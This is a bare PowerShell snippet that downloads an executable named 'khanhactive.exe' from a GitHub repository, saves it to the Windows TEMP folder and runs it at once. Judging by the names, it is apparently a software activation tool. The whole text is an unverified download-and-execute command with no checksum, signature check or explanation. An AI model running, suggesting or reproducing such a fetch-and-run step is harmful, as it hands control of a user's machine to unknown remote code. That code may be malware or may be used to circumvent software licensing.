$u="https://raw.githubusercontent.com/HoangQuocKhanh0504/ACTIVE/root/khanhactive.exe"
$f="$env:TEMP\k.exe"
irm $u -o $f
Start-Process $f
